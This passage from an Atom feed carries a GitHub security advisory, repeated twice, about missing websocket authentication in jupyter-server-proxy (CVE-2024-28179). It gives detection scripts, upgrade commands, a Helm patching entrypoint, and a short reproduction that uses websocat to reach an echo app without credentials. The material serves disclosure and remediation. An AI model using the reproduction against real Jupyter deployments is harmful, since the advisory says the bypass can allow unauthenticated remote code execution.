    print("WARNING: jupyter-server-proxy __is vulnerable__ to GHSA-w3vc-fx9p-wp4v, see https://github.com/jupyterhub/jupyter-server-proxy/security/advisories/GHSA-w3vc-fx9p-wp4v.")
else:
    print("INFO: not vulnerable to GHSA-w3vc-fx9p-wp4v")
'
</code></pre>
<p>Note that if you reference an image with a mutable tag, such as <code>quay.io/jupyter/pangeo-notebook:master</code>, you should ensure a new version is used by configuring the image pull policy so that an older vulnerable version isn't kept being used because it was already available on a Kubernetes node.</p>
<pre><code class="language-yaml">singleuser:
  image:
    name: quay.io/jupyter/pangeo-notebook
    tag: master
    # pullPolicy (a.k.a. imagePullPolicy in k8s specification) should be
    # declared to Always if you make use of mutable tags
    pullPolicy: Always
</code></pre>
<h4 id="2-patch-vulnerabilities-dynamically">2. Patch vulnerabilities dynamically</h4>
<p>If your z2jh deployment still may start vulnerable images for users, you could mount a script that checks and patches the vulnerability before the jupyter server starts.</p>
<p>Below is JupyterHub Helm chart configuration that relies on <a href="https://z2jh.jupyter.org/en/stable/resources/reference.html#singleuser-extrafiles"><code>singleuser.extraFiles</code></a> and <a href="https://z2jh.jupyter.org/en/stable/resources/reference.html#singleuser-cmd"><code>singleuser.cmd</code></a> to mount a script we use as an entrypoint to dynamically check and patch the vulnerability before jupyter server is started.</p>
<p>Unless you change it, the script will attempt to upgrade <code>jupyter-server-proxy</code> to a non-vulnerable version if needed, and error if it needs to and fails. You can adjust this behavior by adjusting the constants <code>UPGRADE_IF_VULNERABLE</code> and <code>ERROR_IF_VULNERABLE</code> inside the script.</p>
<pre><code class="language-yaml">singleuser:
  cmd:
    - /mnt/ghsa-w3vc-fx9p-wp4v/check-patch-run
    - jupyterhub-singleuser
  extraFiles:
    ghsa-w3vc-fx9p-wp4v-check-patch-run:
      mountPath: /mnt/ghsa-w3vc-fx9p-wp4v/check-patch-run
      mode: 0755
      stringData: |
        #!/usr/bin/env python3
        """
        This script is designed to check for and conditionally patch GHSA-w3vc-fx9p-wp4v
        in user servers started by a JupyterHub. The script will execute any command
        passed via arguments if provided, allowing it to wrap a user server startup call
        to `jupyterhub-singleuser` for example.

        Use and function of this script can be further discussed in
        https://github.com/jupyterhub/zero-to-jupyterhub-k8s/issues/3360.

        Script adjustments:
        - UPGRADE_IF_VULNERABLE
        - ERROR_IF_VULNERABLE

        Script patching assumptions:
        - script is run before the jupyter server starts
        - pip is available
        - pip has sufficient filesystem permissions to upgrade jupyter-server-proxy

        Read more at https://github.com/jupyterhub/jupyter-server-proxy/security/advisories/GHSA-w3vc-fx9p-wp4v.
        """

        import os
        import subprocess
        import sys

        # adjust these to meet vulnerability mitigation needs
        UPGRADE_IF_VULNERABLE = True
        ERROR_IF_VULNERABLE = True


        def check_vuln():
            """
            Checks for the vulnerability by looking to see if __version__ is available
            as it coincides with the patched versions (3.2.3 and 4.1.1).
            """
            try:
                import jupyter_server_proxy

                return False if hasattr(jupyter_server_proxy, "__version__") else True
            except:
                return False


        def get_version_specifier():
            """
            Returns a pip version specifier for use with `--no-deps` meant to do as
            little as possible besides patching the vulnerability and remaining
            functional.
            """
            old = ["jupyter-server-proxy&gt;=3.2.3,&lt;4"]
            new = ["jupyter-server-proxy&gt;=4.1.1,&lt;5", "simpervisor&gt;=1,&lt;2"]

            try:
                if sys.version_info &lt; (3, 8):
                    return old

                from importlib.metadata import version

                jsp_version = version("jupyter-server-proxy")
                if int(jsp_version.split(".")[0]) &lt; 4:
                    return old
            except:
                pass
            return new


        def patch_vuln():
            """
            Attempts to patch the vulnerability by upgrading jupyter-server-proxy using
            pip. Returns True if the patch is applied successfully, otherwise False.
            """
            # attempt upgrade via pip, takes ~4 seconds
            proc = subprocess.run(
                [sys.executable, "-m", "pip", "--version"],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )
            pip_available = proc.returncode == 0
            if pip_available:
                proc = subprocess.run(
                    [sys.executable, "-m", "pip", "install", "--no-deps"]
                    + get_version_specifier()
                )
                if proc.returncode == 0:
                    return True
            return False


        def main():
            if check_vuln():
                warning_or_error = (
                    "ERROR" if ERROR_IF_VULNERABLE and not UPGRADE_IF_VULNERABLE else "WARNING"
                )
                print(
                    f"{warning_or_error}: jupyter-server-proxy __is vulnerable__ to GHSA-w3vc-fx9p-wp4v, see "
                    "https://github.com/jupyterhub/jupyter-server-proxy/security/advisories/GHSA-w3vc-fx9p-wp4v.",
                    flush=True,
                )
                if warning_or_error == "ERROR":
                    sys.exit(1)

                if UPGRADE_IF_VULNERABLE:
                    print(
                        "INFO: Attempting to upgrade jupyter-server-proxy using pip...",
                        flush=True,
                    )
                    if patch_vuln():
                        print(
                            "INFO: Attempt to upgrade jupyter-server-proxy succeeded!",
                            flush=True,
                        )
                    else:
                        warning_or_error = "ERROR" if ERROR_IF_VULNERABLE else "WARNING"
                        print(
                            f"{warning_or_error}: Attempt to upgrade jupyter-server-proxy failed!",
                            flush=True,
                        )
                        if warning_or_error == "ERROR":
                            sys.exit(1)

            if len(sys.argv) &gt;= 2:
                print("INFO: Executing provided command", flush=True)
                os.execvp(sys.argv[1], sys.argv[1:])
            else:
                print("INFO: No command to execute provided", flush=True)


        main()
</code></pre>
<h4 id="3-consider-terminating-currently-running-user-servers-1">3. Consider terminating currently running user servers</h4>
<p>User servers that started before the patch was applied are still vulnerable. To ensure they aren't vulnerable any more you could forcefully terminate their servers via the JupyterHub web interface at <code>https://&lt;your domain&gt;/hub/admin</code>.</p>
</details>

<h2 id="simple-reproduction">Simple Reproduction</h2>
<details><summary>Expand to read more</summary>

<h3 id="setup-application-to-proxy">Setup application to proxy</h3>
<p>Make a trivial tornado app that has both websocket and regular HTTP endpoints.</p>
<pre><code class="language-python">from tornado import websocket, web, ioloop

class EchoWebSocket(websocket.WebSocketHandler):
    def open(self):
        print("WebSocket opened")

    def on_message(self, message):
        self.write_message(u"You said: " + message)

    def on_close(self):
        print("WebSocket closed")

class HiHandler(web.RequestHandler):
    def get(self):
        self.write("Hi")

app = web.Application([
    (r'/ws', EchoWebSocket),
    (r'/hi', HiHandler)
])

if __name__ == '__main__':
    app.listen(9500)
    ioloop.IOLoop.instance().start()
</code></pre>
<h3 id="setup-a-clean-environment-with-jupyter-server-proxy-and-start-a-jupyter-server-instance">Setup a clean environment with <code>jupyter-server-proxy</code> and start a <code>jupyter server</code> instance</h3>
<p>We don't need jupyterlab or anything else here, just <code>jupyter-server-proxy</code> would do.</p>
<pre><code class="language-bash">python -m venv clean-env/
source clean-env/bin/activate
pip install jupyter-server-proxy
jupyter server
</code></pre>
<h3 id="verify-http-requests-require-authentication">Verify HTTP requests require authentication</h3>
<pre><code class="language-bash">curl -L http://127.0.0.1:8888/proxy/9500/hi
</code></pre>
<p>This does <em>not</em> return the <code>Hi</code> response, as expected. Instead, you get the HTML response asking for a token.</p>
<p>This is secure as intended.</p>
<h3 id="verify-websocket-requests-doesnt-authentication">Verify websocket requests doesn't authentication</h3>
<p>The example makes use of <a href="https://github.com/vi/websocat">websocat</a> to test websockets. You can use any other tool you are familiar with too.</p>
<pre><code class="language-bash">websocat ws://localhost:8888/proxy/9500/ws
</code></pre>
<p>At the terminal, type 'Just testing' and press Enter. You'll get <code>You said: Just testing</code> without any authentication required.</p>
</details>
### References

<ul>
<li><a href="https://github.com/jupyterhub/jupyter-server-proxy/security/advisories/GHSA-w3vc-fx9p-wp4v">https://github.com/jupyterhub/jupyter-server-proxy/security/advisories/GHSA-w3vc-fx9p-wp4v</a></li>
<li><a href="https://github.com/jupyterhub/jupyter-server-proxy/commit/764e499f61a87641916a7a427d4c4b1ac3f321a9">https://github.com/jupyterhub/jupyter-server-proxy/commit/764e499f61a87641916a7a427d4c4b1ac3f321a9</a></li>
<li><a href="https://github.com/jupyterhub/jupyter-server-proxy/commit/bead903b7c0354b6efd8b4cde94b89afab653e03">https://github.com/jupyterhub/jupyter-server-proxy/commit/bead903b7c0354b6efd8b4cde94b89afab653e03</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-28179">https://nvd.nist.gov/vuln/detail/CVE-2024-28179</a></li>
<li><a href="https://github.com/jupyterhub/jupyter-server-proxy/blob/9b624c4d9507176334b46a85d94a4aa3bcd29bed/jupyter_server_proxy/handlers.py#L433">https://github.com/jupyterhub/jupyter-server-proxy/blob/9b624c4d9507176334b46a85d94a4aa3bcd29bed/jupyter_server_proxy/handlers.py#L433</a></li>
<li><a href="https://github.com/advisories/GHSA-w3vc-fx9p-wp4v">https://github.com/advisories/GHSA-w3vc-fx9p-wp4v</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-w3vc-fx9p-wp4v</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2024-03-20T15:22:02.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[jupyter-server-proxy] Jupyter Server Proxy's Websocket Proxying does not require authentication]]></title>
        <id>https://github.com/advisories/GHSA-w3vc-fx9p-wp4v</id>
        <link href="https://github.com/advisories/GHSA-w3vc-fx9p-wp4v"/>
        <updated>2024-03-20T21:38:04.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p><code>jupyter-server-proxy</code> is used to expose ports local to a Jupyter server listening to web traffic to the Jupyter server's <em>authenticated users</em> by proxying web requests and websockets. Dependent packages (<a href="https://www.wheelodex.org/projects/jupyter-server-proxy/rdepends/">partial list</a>) also use <code>jupyter-server-proxy</code> to expose other popular interactive applications (such as <a href="https://github.com/jupyterhub/jupyter-rsession-proxy">RStudio</a>, <a href="https://github.com/jupyterhub/jupyter-remote-desktop-proxy">Linux Desktop via VNC</a>, <a href="https://github.com/betatim/vscode-binder">Code Server</a>, <a href="https://github.com/holoviz/jupyter-panel-proxy">Panel</a>, etc) along with the Jupyter server. This feature is commonly used in hosted environments (such as a JupyterHub) to expose non-Jupyter interactive frontends or APIs to the user.</p>
<p><code>jupyter-server-proxy</code> did not check user authentication appropriately when proxying websockets, allowing unauthenticated access to anyone who had network access to the Jupyter server endpoint.</p>
<h2 id="impact">Impact</h2>
<p>This vulnerability can allow unauthenticated remote access to any websocket endpoint set up to be accessible via <code>jupyter-server-proxy</code>. In many cases (such as when exposing RStudio via <a href="https://github.com/jupyterhub/jupyter-rsession-proxy"><code>jupyter-rsession-proxy</code></a> or a remote Linux Desktop / VNC via <a href="https://github.com/jupyterhub/jupyter-remote-desktop-proxy"><code>jupyter-remote-desktop-proxy</code></a>), this leads to <strong>remote unauthenticated arbitrary code execution</strong>, due to how they use websockets. The websocket endpoints exposed by <code>jupyter_server</code> itself is not affected. Projects that do not rely on websockets are also not affected.</p>
<h2 id="remediation">Remediation</h2>
<p>Upgrade <code>jupyter-server-proxy</code> to a patched version and restart any running Jupyter server.</p>
<p>You may not be installing <code>jupyter-server-proxy</code> directly, but have it be pulled in as a dependency (<a href="https://www.wheelodex.org/projects/jupyter-server-proxy/rdepends/">partial list of dependent packages</a>) - so you may be vulnerable even if you aren't directly depending on <code>jupyter-server-proxy</code>.</p>
<h3 id="for-jupyterhub-admins-of-tljh-installations">For JupyterHub admins of <a href="https://tljh.jupyter.org">TLJH</a> installations</h3>
<details><summary>Expand to read more</summary>

<p>To secure a tljh deployment's user servers, first check if <code>jupyter-server-proxy</code> is installed in the user environment with a vulnerable version. If it is, patch the vulnerability and consider terminating currently running user servers.</p>
<h4 id="1-check-for-vulnerability">1. Check for vulnerability</h4>
<p>As an JupyterHub admin from a terminal in a started user server, you can do:</p>
<pre><code class="language-bash">sudo -E python3 -c '
try:
    import jupyter_server_proxy
    is_vulnerable = not hasattr(jupyter_server_proxy, "__version__")
except:
    is_vulnerable = False
if is_vulnerable:
    print("WARNING: jupyter-server-proxy __is vulnerable__ to GHSA-w3vc-fx9p-wp4v, see https://github.com/jupyterhub/jupyter-server-proxy/security/advisories/GHSA-w3vc-fx9p-wp4v.")
else:
    print("INFO: not vulnerable to GHSA-w3vc-fx9p-wp4v")
'
</code></pre>
<p>Alternatively as a root user on the server where tljh is installed, you can do:</p>
<pre><code class="language-bash">sudo PATH=/opt/tljh/user/bin:${PATH} python3 -c '
try:
    import jupyter_server_proxy
    is_vulnerable = not hasattr(jupyter_server_proxy, "__version__")
except:
    is_vulnerable = False
if is_vulnerable:
    print("WARNING: jupyter-server-proxy __is vulnerable__ to GHSA-w3vc-fx9p-wp4v, see https://github.com/jupyterhub/jupyter-server-proxy/security/advisories/GHSA-w3vc-fx9p-wp4v.")
else:
    print("INFO: not vulnerable to GHSA-w3vc-fx9p-wp4v")
'
</code></pre>
<h4 id="2-patch-detected-vulnerability">2. Patch detected vulnerability</h4>
<p>As an JupyterHub admin from a terminal in a started user server, you can do:</p>
<pre><code class="language-bash">sudo -E pip install "jupyter-server-proxy&gt;=3.2.3,!=4.0.0,!=4.1.0"
</code></pre>
<p>Alternatively as a root user on the server where tljh is installed, you can do:</p>
<pre><code class="language-bash">sudo PATH=/opt/tljh/user/bin:${PATH} pip install "jupyter-server-proxy&gt;=3.2.3,!=4.0.0,!=4.1.0"
</code></pre>
<h4 id="3-consider-terminating-currently-running-user-servers">3. Consider terminating currently running user servers</h4>
<p>User servers that started before the patch was applied are still vulnerable. To ensure they aren't vulnerable any more you could forcefully terminate their servers via the JupyterHub web interface at <code>https://&lt;your domain&gt;/hub/admin</code>.</p>
</details>

<h3 id="for-jupyterhub-admins-of-z2jh-installations">For JupyterHub admins of <a href="https://z2jh.jupyter.org">Z2JH</a> installations</h3>
<details><summary>Expand to read more</summary>

<p>To secure your z2jh deployment's user servers, first consider if one or more user environments is or may be vulnerable, then ensure new user servers' aren't started with the vulnerability, and finally consider terminating currently running user servers. The steps below guide you to do so.</p>
<h4 id="1-check-for-vulnerabilities">1. Check for vulnerabilities</h4>
<p>Consider all docker images that user servers' environment may be based on. If your deployment expose a fixed set of images, you may be able to update them to non-vulnerable versions.</p>
<p>To check if an individual docker image is vulnerable, use a command like:</p>
<pre><code class="language-bash">CHECK_IMAGE=jupyter/base-notebook:2023-10-20
docker run --rm $CHECK_IMAGE python3 -c '
try:
    import jupyter_server_proxy
    is_vulnerable = not hasattr(jupyter_server_proxy, "__version__")
except:
    is_vulnerable = False
if is_vulnerable:
    print("WARNING: jupyter-server-proxy __is vulnerable__ to GHSA-w3vc-fx9p-wp4v, see https://github.com/jupyterhub/jupyter-server-proxy/security/advisories/GHSA-w3vc-fx9p-wp4v.")
else:
    print("INFO: not vulnerable to GHSA-w3vc-fx9p-wp4v")
'
</code></pre>
<p>Note that if you reference an image with a mutable tag, such as <code>quay.io/jupyter/pangeo-notebook:master</code>, you should ensure a new version is used by configuring the image pull policy so that an older vulnerable version isn't kept being used because it was already available on a Kubernetes node.</p>
<pre><code class="language-yaml">singleuser:
  image:
    name: quay.io/jupyter/pangeo-notebook
    tag: master
    # pullPolicy (a.k.a. imagePullPolicy in k8s specification) should be
    # declared to Always if you make use of mutable tags
    pullPolicy: Always
</code></pre>
<h4 id="2-patch-vulnerabilities-dynamically">2. Patch vulnerabilities dynamically</h4>
<p>If your z2jh deployment still may start vulnerable images for users, you could mount a script that checks and patches the vulnerability before the jupyter server starts.</p>
<p>Below is JupyterHub Helm chart configuration that relies on <a href="https://z2jh.jupyter.org/en/stable/resources/reference.html#singleuser-extrafiles"><code>singleuser.extraFiles</code></a> and <a href="https://z2jh.jupyter.org/en/stable/resources/reference.html#singleuser-cmd"><code>singleuser.cmd</code></a> to mount a script we use as an entrypoint to dynamically check and patch the vulnerability before jupyter server is started.</p>
<p>Unless you change it, the script will attempt to upgrade <code>jupyter-server-proxy</code> to a non-vulnerable version if needed, and error if it needs to and fails. You can adjust this behavior by adjusting the constants <code>UPGRADE_IF_VULNERABLE</code> and <code>ERROR_IF_VULNERABLE</code> inside the script.</p>
<pre><code class="language-yaml">singleuser:
  cmd:
    - /mnt/ghsa-w3vc-fx9p-wp4v/check-patch-run
    - jupyterhub-singleuser
  extraFiles:
    ghsa-w3vc-fx9p-wp4v-check-patch-run:
      mountPath: /mnt/ghsa-w3vc-fx9p-wp4v/check-patch-run
      mode: 0755
      stringData: |
        #!/usr/bin/env python3
        """
        This script is designed to check for and conditionally patch GHSA-w3vc-fx9p-wp4v
        in user servers started by a JupyterHub. The script will execute any command
        passed via arguments if provided, allowing it to wrap a user server startup call
        to `jupyterhub-singleuser` for example.

        Use and function of this script can be further discussed in
        https://github.com/jupyterhub/zero-to-jupyterhub-k8s/issues/3360.

        Script adjustments:
        - UPGRADE_IF_VULNERABLE
        - ERROR_IF_VULNERABLE

        Script patching assumptions:
        - script is run before the jupyter server starts
        - pip is available
        - pip has sufficient filesystem permissions to upgrade jupyter-server-proxy

        Read more at https://github.com/jupyterhub/jupyter-server-proxy/security/advisories/GHSA-w3vc-fx9p-wp4v.
        """

        import os
        import subprocess
        import sys

        # adjust these to meet vulnerability mitigation needs
        UPGRADE_IF_VULNERABLE = True
        ERROR_IF_VULNERABLE = True


        def check_vuln():
            """
            Checks for the vulnerability by looking to see if __version__ is available
            as it coincides with the patched versions (3.2.3 and 4.1.1).
            """
            try:
                import jupyter_server_proxy

                return False if hasattr(jupyter_server_proxy, "__version__") else True
            except:
                return False


        def get_version_specifier():
            """
            Returns a pip version specifier for use with `--no-deps` meant to do as
            little as possible besides patching the vulnerability and remaining
            functional.
            """
            old = ["jupyter-server-proxy&gt;=3.2.3,&lt;4"]
            new = ["jupyter-server-proxy&gt;=4.1.1,&lt;5", "simpervisor&gt;=1,&lt;2"]

            try:
                if sys.version_info &lt; (3, 8):
                    return old

                from importlib.metadata import version

                jsp_version = version("jupyter-server-proxy")
                if int(jsp_version.split(".")[0]) &lt; 4:
                    return old
            except:
                pass
            return new


        def patch_vuln():
            """
            Attempts to patch the vulnerability by upgrading jupyter-server-proxy using
            pip. Returns True if the patch is applied successfully, otherwise False.
            """
            # attempt upgrade via pip, takes ~4 seconds
            proc = subprocess.run(
                [sys.executable, "-m", "pip", "--version"],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )
            pip_available = proc.returncode == 0
            if pip_available:
                proc = subprocess.run(
                    [sys.executable, "-m", "pip", "install", "--no-deps"]
                    + get_version_specifier()
                )
                if proc.returncode == 0:
                    return True
            return False


        def main():
            if check_vuln():
                warning_or_error = (
                    "ERROR" if ERROR_IF_VULNERABLE and not UPGRADE_IF_VULNERABLE else "WARNING"
                )
                print(
                    f"{warning_or_error}: jupyter-server-proxy __is vulnerable__ to GHSA-w3vc-fx9p-wp4v, see "
                    "https://github.com/jupyterhub/jupyter-server-proxy/security/advisories/GHSA-w3vc-fx9p-wp4v.",
                    flush=True,
                )
                if warning_or_error == "ERROR":
                    sys.exit(1)

                if UPGRADE_IF_VULNERABLE:
                    print(
                        "INFO: Attempting to upgrade jupyter-server-proxy using pip...",
                        flush=True,
                    )
                    if patch_vuln():
                        print(
                            "INFO: Attempt to upgrade jupyter-server-proxy succeeded!",
                            flush=True,
                        )
                    else:
                        warning_or_error = "ERROR" if ERROR_IF_VULNERABLE else "WARNING"
                        print(
                            f"{warning_or_error}: Attempt to upgrade jupyter-server-proxy failed!",
                            flush=True,
                        )
                        if warning_or_error == "ERROR":
                            sys.exit(1)

            if len(sys.argv) &gt;= 2:
                print("INFO: Executing provided command", flush=True)
                os.execvp(sys.argv[1], sys.argv[1:])
            else:
                print("INFO: No command to execute provided", flush=True)


        main()
</code></pre>
<h4 id="3-consider-terminating-currently-running-user-servers-1">3. Consider terminating currently running user servers</h4>
<p>User servers that started before the patch was applied are still vulnerable. To ensure they aren't vulnerable any more you could forcefully terminate their servers via the JupyterHub web interface at <code>https://&lt;your domain&gt;/hub/admin</code>.</p>
</details>

<h2 id="simple-reproduction">Simple Reproduction</h2>
<details><summary>Expand to read more</summary>

<h3 id="setup-application-to-proxy">Setup application to proxy</h3>
<p>Make a trivial tornado app that has both websocket and regular HTTP endpoints.</p>
<pre><code class="language-python">from tornado import websocket, web, ioloop

class EchoWebSocket(websocket.WebSocketHandler):
    def open(self):
        print("WebSocket opened")

    def on_message(self, message):
        self.write_message(u"You said: " + message)

    def on_close(self):
        print("WebSocket closed")

class HiHandler(web.RequestHandler):
    def get(self):
        self.write("Hi")

app = web.Application([
    (r'/ws', EchoWebSocket),
    (r'/hi', HiHandler)
])

if __name__ == '__main__':
    app.listen(9500)
    ioloop.IOLoop.instance().start()
</code></pre>
<h3 id="setup-a-clean-environment-with-jupyter-server-proxy-and-start-a-jupyter-server-instance">Setup a clean environment with <code>jupyter-server-proxy</code> and start a <code>jupyter server</code> instance</h3>
<p>We don't need jupyterlab or anything else here, just <code>jupyter-server-proxy</code> would do.</p>
<pre><code class="language-bash">python -m venv clean-env/
source clean-env/bin/activate
pip install jupyter-server-proxy
jupyter server
</code></pre>
<h3 id="verify-http-requests-require-authentication">Verify HTTP requests require authentication</h3>
<pre><code class="language-bash">curl -L http://127.0.0.1:8888/proxy/9500/hi
</code></pre>
<p>This does <em>not</em> return the <code>Hi</code> response, as expected. Instead, you get the HTML response asking for a token.</p>
<p>This is secure as intended.</p>
<h3 id="verify-websocket-requests-doesnt-authentication">Verify websocket requests doesn't authentication</h3>
<p>The example makes use of <a href="https://github.com/vi/websocat">websocat</a> to test websockets. You can use any other tool you are familiar with too.</p>
<pre><code class="language-bash">websocat ws://localhost:8888/proxy/9500/ws
</code></pre>
<p>At the terminal, type 'Just testing' and press Enter. You'll get <code>You said: Just testing</code> without any authentication required.</p>
</details>
### References

<ul>
<li><a href="https://github.com/jupyterhub/jupyter-server-proxy/security/advisories/GHSA-w3vc-fx9p-wp4v">https://github.com/jupyterhub/jupyter-server-proxy/security/advisories/GHSA-w3vc-fx9p-wp4v</a></li>
<li><a href="https://github.com/jupyterhub/jupyter-server-proxy/commit/764e499f61a87641916a7a427d4c4b1ac3f321a9">https://github.com/jupyterhub/jupyter-server-proxy/commit/764e499f61a87641916a7a427d4c4b1ac3f321a9</a></li>
<li><a href="https://github.com/jupyterhub/jupyter-server-proxy/commit/bead903b7c0354b6efd8b4cde94b89afab653e03">https://github.com/jupyterhub/jupyter-server-proxy/commit/bead903b7c0354b6efd8b4cde94b89afab653e03</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-28179">https://nvd.nist.gov/vuln/detail/CVE-2024-28179</a></li>
<li><a href="https://github.com/jupyterhub/jupyter-server-proxy/blob/9b624c4d9507176334b46a85d94a4aa3bcd29bed/jupyter_server_proxy/handlers.py#L433">https://github.com/jupyterhub/jupyter-server-proxy/blob/9b624c4d9507176334b46a85d94a4aa3bcd29bed/jupyter_server_proxy/handlers.py#L433</a></li>
<li><a href="https://github.com/advisories/GHSA-w3vc-fx9p-wp4v">https://github.com/advisories/GHSA-w3vc-fx9p-wp4v</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-w3vc-fx9p-wp4v</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2024-03-20T15:22:02.000Z</published>
    </entry>
</feed>